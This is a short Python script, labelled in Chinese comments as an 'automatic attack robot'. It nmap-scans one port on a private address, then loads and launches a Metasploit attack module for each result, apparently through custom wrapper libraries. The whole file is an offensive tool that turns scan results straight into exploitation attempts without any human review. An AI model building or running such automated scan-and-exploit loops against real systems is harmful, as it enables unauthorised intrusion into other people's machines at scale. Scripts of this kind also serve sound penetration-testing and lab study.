
from py_config import ConfigFactory
from py_logging import LoggerFactory
from py_metasploit import MetasploitClient
from py_scaner import Scanner

# 自动攻击机器人
config = ConfigFactory(config_file='py_robot202.ini').get_config()
logger = LoggerFactory(config_factory=config).get_logger()

# 初始化
scanner = Scanner(config=config, logger=logger)
metasploit_client = MetasploitClient(config=config, logger=logger)

# 使用nmap扫描端口
result = scanner.nmap('192.168.33.238', 18080)
print(result)

# 如果nmap得到特征字
if len(result) > 0:
    for script_name in result:
        attack_script = metasploit_client.load_script(script_name=script_name)
        result = metasploit_client.attack(attack_script=attack_script)
else:
    result = 'failure'
print(result)
